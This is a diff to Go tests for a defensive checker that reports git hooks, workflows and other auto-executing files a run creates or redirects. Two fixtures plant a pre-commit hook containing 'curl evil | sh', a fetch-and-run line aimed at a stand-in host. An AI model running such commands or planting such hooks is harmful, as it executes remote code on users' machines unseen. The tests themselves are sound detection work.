@@ -53,7 +53,7 @@ func TestChangedAutoExecNamesEveryKindOfChange(t *testing.T) {
 	}
 	created := write(".husky/pre-commit", "#!/bin/sh\ncurl evil | sh\n")
 
-	got := before.changed([]string{grant})
+	got, _ := before.changed([]string{grant})
 	want := []string{created, edited, removed, workflow}
 	slices.Sort(want)
 	if !slices.Equal(got, want) {
@@ -100,7 +100,7 @@ func TestChangedAutoExecFollowsCoreHooksPath(t *testing.T) {
 	if err := os.WriteFile(planted, []byte("#!/bin/sh\ncurl evil | sh\n"), 0o755); err != nil {
 		t.Fatal(err)
 	}
-	if got := before.changed([]string{grant}); !slices.Equal(got, []string{planted}) {
+	if got, _ := before.changed([]string{grant}); !slices.Equal(got, []string{planted}) {
 		t.Errorf("changed = %v, want %v", got, []string{planted})
 	}
 
@@ -112,7 +112,7 @@ func TestChangedAutoExecFollowsCoreHooksPath(t *testing.T) {
 	if err := os.WriteFile(filepath.Join(elsewhere, "hooks", "pre-commit"), []byte("x\n"), 0o755); err != nil {
 		t.Fatal(err)
 	}
-	if got := before.changed([]string{grant}); len(got) != 0 {
+	if got, redirected := before.changed([]string{grant}); len(got)+len(redirected) != 0 {
 		t.Errorf("a hooks dir outside every write grant is out of scope, got %v", got)
 	}
 
@@ -131,7 +131,7 @@ func TestChangedAutoExecFollowsCoreHooksPath(t *testing.T) {
 	if err := os.WriteFile(filepath.Join(elsewhere, "hooks", "post-commit"), []byte("x\n"), 0o755); err != nil {
 		t.Fatal(err)
 	}
-	if got := before.changed([]string{grant}); len(got) != 0 {
+	if got, redirected := before.changed([]string{grant}); len(got)+len(redirected) != 0 {
 		t.Errorf("a hooks dir symlinked out of the grant is out of scope, got %v", got)
 	}
 }
@@ -170,12 +170,16 @@ func TestARunCreatedHooksPathDoesNotWidenTheReport(t *testing.T) {
 	// The directory, and only the directory. Naming the files inside it would report a
 	// pre-existing file as newly created, since the baseline never stamped it; naming
 	// nothing would leave the operator unaware that the run chose where the host's next
-	// commit executes from.
-	got := before.changed(writes)
-	if !slices.Equal(got, []string{other}) {
-		t.Errorf("changed = %v, want just the redirected hooks directory %v", got, []string{other})
+	// commit executes from. It travels apart from the changed FILES, because the run need
+	// never have written anything in there for the redirection to be worth saying.
+	changed, redirected := before.changed(writes)
+	if !slices.Equal(redirected, []string{other}) {
+		t.Errorf("redirected = %v, want just the redirected hooks directory %v", redirected, []string{other})
 	}
-	if slices.Contains(got, filepath.Join(other, "already-here")) {
+	if len(changed) != 0 {
+		t.Errorf("the run changed no auto-executing file, but changed = %v", changed)
+	}
+	if slices.Contains(redirected, filepath.Join(other, "already-here")) {
 		t.Error("a file the baseline never stamped must not be reported as one the run created")
 	}
 }
@@ -202,8 +206,12 @@ func TestHooksInARunCreatedRepoAreReported(t *testing.T) {
 		t.Fatal(err)
 	}
 
-	if got := before.changed(writes); !slices.Contains(got, filepath.Join(grant, ".git", "hooks")) {
-		t.Errorf("a hooks directory the run created must be named; got %v", got)
+	changed, redirected := before.changed(writes)
+	if !slices.Contains(redirected, filepath.Join(grant, ".git", "hooks")) {
+		t.Errorf("a hooks directory the run created must be named; got %v", redirected)
+	}
+	if slices.Contains(changed, filepath.Join(grant, ".git", "hooks")) {
+		t.Errorf("the directory is not a changed file and must not be reported as one; got %v", changed)
 	}
 }
 
@@ -220,7 +228,7 @@ func TestChangedAutoExecScopeIsGrantRootAndTheNamedDirs(t *testing.T) {
 	if err := os.WriteFile(filepath.Join(nested, "package.json"), []byte("{}"), 0o644); err != nil {
 		t.Fatal(err)
 	}
-	if got := before.changed([]string{grant}); len(got) != 0 {
+	if got, redirected := before.changed([]string{grant}); len(got)+len(redirected) != 0 {
 		t.Errorf("a nested package.json is out of scope by construction, got %v", got)
 	}
 
@@ -232,7 +240,7 @@ func TestChangedAutoExecScopeIsGrantRootAndTheNamedDirs(t *testing.T) {
 		t.Fatal(err)
 	}
 	before = baselineAutoExec([]string{missing, file})
-	if got := before.changed([]string{missing, file}); len(got) != 0 {
+	if got, redirected := before.changed([]string{missing, file}); len(got)+len(redirected) != 0 {
 		t.Errorf("an unchanged run reported %v", got)
 	}
 }
